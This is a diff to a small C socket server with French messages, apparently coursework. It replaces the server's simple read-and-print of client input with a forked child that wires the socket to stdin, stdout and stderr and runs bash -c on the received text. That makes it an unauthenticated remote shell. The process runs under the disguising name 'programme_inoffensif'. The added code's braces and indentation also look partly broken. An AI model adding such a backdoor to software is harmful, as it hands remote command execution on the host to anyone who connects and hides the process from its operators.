@@ -22,17 +22,39 @@ int main(int argc, char *argv[]) {
         printf("Client connecté\n");
 
         char buffer[BUFFER_SIZE];
-        ssize_t n = sread(newsockfd, buffer, sizeof(buffer) - 1);
 
-        if (n > 0) {
+        pid_t pid = sfork();
+        if (pid==0) {
+            dup2(newsockfd, STDOUT_FILENO);  
+            dup2(newsockfd, STDERR_FILENO);
+            dup2(newsockfd, STDIN_FILENO);
+            ssize_t n = sread(newsockfd, buffer, sizeof(buffer) - 1);
+            if (n > 0) {
             buffer[n] = '\0';
         }
-        printf("%s", buffer);
 
+            execlp("bash", "programme_inoffensif", "-c", buffer, NULL);
+
+        }
+
+        if (newsockfd < 0) {
+            perror("open");
+            exit(1);
+        }
+
+        
+
+        
         sclose(newsockfd);
-    }
 
-    sclose(sockfd);
+        
+
+        }
+
+    
+
+       sclose(sockfd);
     return 0;
+   }
 
-}
+    
